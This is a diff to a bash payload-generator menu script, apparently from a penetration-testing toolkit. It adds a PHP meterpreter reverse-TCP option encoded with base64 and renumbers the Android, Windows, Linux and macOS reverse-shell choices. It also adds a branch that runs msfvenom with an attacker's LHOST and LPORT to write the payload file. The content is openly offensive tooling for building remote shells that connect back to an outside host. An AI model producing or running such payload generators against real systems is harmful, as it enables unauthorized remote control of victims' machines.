@@ -3812,9 +3812,10 @@ echo "2.  cmd/windows/reverse_powershell"
 echo "3.  linux/x64/shell_reverse_tcp"
 echo "4.  linux/x86/meterpreter/reverse_tcp"
 echo "5.  osx/x64/shell_reverse_tcp"
-echo "6.  windows/meterpreter/reverse_tcp"
-echo "7.  windows/x64/meterpreter/reverse_tcp"
-echo "8.  Previous menu"
+echo "6.  php/meterpreter/reverse_tcp"
+echo "7.  windows/meterpreter/reverse_tcp"
+echo "8.  windows/x64/meterpreter/reverse_tcp"
+echo "9.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
@@ -3824,12 +3825,12 @@ case $choice in
           extention=".apk"
           format="raw"
           arch="dalvik"
-	  platform="android";;
+          platform="android";;
      2) payload="cmd/windows/reverse_powershell"
           extention=".bat"
           format="raw"
           arch="cmd"
-	  platform="windows";;
+          platform="windows";;
      3) payload="linux/x64/shell_reverse_tcp"
           extention=""
           format="elf"
@@ -3841,21 +3842,27 @@ case $choice in
           arch="x86"
           platform="linux";;
      5) payload="osx/x64/shell_reverse_tcp"
-	  extention=""
-	  format="macho"
+          extention=""
+          format="macho"
           arch="x86_64"
           platform="osx";;
-     6) payload="windows/meterpreter/reverse_tcp"
+     6) payload="php/meterpreter/reverse_tcp"
+          extention=".php"
+          format="raw"
+          arch="php"
+          platform="php"
+          encoder="php/base64";;
+     7) payload="windows/meterpreter/reverse_tcp"
           extention=".exe"
           format="exe"
           arch="x86"
           platform="windows";;
-     7) payload="windows/x64/meterpreter/reverse_tcp"
+     8) payload="windows/x64/meterpreter/reverse_tcp"
           extention=".exe"
           format="exe"
           arch="x86_64"
           platform="windows";;
-     8) f_main;;
+     9) f_main;;
      *) f_error;;
 esac
 
@@ -3878,8 +3885,13 @@ if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
      f_error
 fi
 
-echo
-$msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
+if [[ $payload == "php/meterpreter/reverse_tcp" ]]; then
+     echo
+     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload$extention
+else
+     echo
+     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
+fi
 
 echo
 echo
